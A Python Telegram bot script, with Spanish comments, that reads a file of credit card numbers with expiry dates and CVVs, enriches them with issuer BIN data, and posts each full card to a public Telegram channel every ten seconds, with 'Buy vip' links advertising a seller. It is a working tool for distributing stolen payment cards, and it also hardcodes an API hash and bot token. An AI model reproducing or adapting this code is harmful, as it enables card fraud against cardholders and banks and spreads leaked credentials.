from pyrogram import Client, types
import random
import time
from bin import get_iso  # Asegúrate de que `bin.py` esté en la misma carpeta o ajusta la ruta según sea necesario.

API_ID = "27533879"
API_HASH = "80029e88381fe5c63e364687906458a0"
TOKEN = "7271806602:AAHyxXa4txQNOnvquvvzvFaCyI4ztg-leQs"

app = Client("card_sender_bot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)

# Cargar los archivos
ccs_path = '/storage/emulated/0/Download/app2/scrappRpd/ccs.txt'
bins_path = '/storage/emulated/0/Download/app2/scrappRpd/bins.csv'

# Leer y procesar el archivo de BINs
bins = {}
with open(bins_path, 'r') as file:
    lines = file.readlines()[1:]  # Omitir la primera línea (cabecera)
    for line in lines:
        parts = line.strip().split(',')
        bin_number = parts[0].strip('"')
        bins[bin_number] = {
            'country': parts[1].strip('"'),
            'flag': parts[2].strip('"'),
            'vendor': parts[3].strip('"'),
            'type': parts[4].strip('"'),
            'level': parts[5].strip('"'),
            'bank': parts[6].strip('"')
        }

# Función para formatear el mensaje
def formatear_mensaje(cc, bin_info):
    cc_number, month, year, cvv = cc.split('|')
    bin_number = cc_number[:6]
    
    # Formatear el número de tarjeta para el campo Extra
    cc_extra = f"{cc_number[:12]}xxxx|{month}|{year}"
    
    # Obtener el nombre completo del país
    country_name = get_iso(bin_info['country'])
    
    # Crear el mensaje con el formato especificado
    mensaje = f"""**[𝑴𝒂𝒌𝒊𝑺𝒄𝒓𝒂𝒑𝒑𝒆𝒓⽷](tg://user?id=)** **[#B{bin_number} - {bin_info['flag']}]**
**- - - - - - - - - - - - - - - - - - - - -**
**Bank**: <code>**{bin_info['bank']}**</code>
**Info**: <code>**{bin_info['vendor']} | {bin_info['type']} | {bin_info['level']}**</code>
**Country**: <code>**{country_name} {bin_info['flag']}**</code>
**- - - - - - - - - - - - - - - - - - - - -**
**[⽷](tg://user?id=)** **CC** » <code>**{cc}**</code>
**[⽷](tg://user?id=)** **Extra** » <code>**{cc_extra}**</code>
**[⽷](tg://user?id=)** **Buy vip** » **[𝙉𝙞𝙭𝙩𝙤 低](t.me/Sunblack12)**
**- - - - - - - - - - - - - - - - - - - - -**
"""
    return mensaje

# Función para enviar tarjetas de manera secuencial sin repetir bancos consecutivamente
def enviar_tarjetas():
    global ccs
    prev_bank = None
    tarjetas_enviadas = []

    while ccs:
        random.shuffle(ccs)
        for cc in ccs[:]:
            cc = cc.strip()
            bin_number = cc[:6]
            bin_info = bins.get(bin_number)

            if bin_info and bin_info['bank'] != prev_bank:
                # Formatear el mensaje
                mensaje = formatear_mensaje(cc, bin_info)
                
                # Crear los botones en línea
                botones = types.InlineKeyboardMarkup([
                    [
                        types.InlineKeyboardButton("𝑶𝒘𝒏𝒆𝒓", url="https://t.me/Sunblack12"),
                        types.InlineKeyboardButton("𝑪𝒉𝒂𝒏𝒏𝒆𝒍", url="https://t.me/Makiscrappref")
                    ]
                ])
                
                # Enviar el mensaje al canal con los botones en línea
                app.send_message(
                    chat_id="@nixtoscrapfree",
                    text=mensaje,
                    reply_markup=botones,
                    disable_web_page_preview=True  # Deshabilitar vista previa de enlaces
                )

                # Actualizar el banco previo
                prev_bank = bin_info['bank']

                # Agregar tarjeta a la lista de enviadas
                tarjetas_enviadas.append(cc)
                
                # Esperar 10 segundos antes de enviar el siguiente mensaje
                time.sleep(10)

        # Eliminar las tarjetas enviadas del archivo
        ccs = [cc for cc in ccs if cc not in tarjetas_enviadas]
        tarjetas_enviadas = []
        with open(ccs_path, 'w') as file:
            file.writelines(ccs)

# Leer el archivo de tarjetas de crédito
with open(ccs_path, 'r') as file:
    ccs = file.readlines()

with app:
    enviar_tarjetas()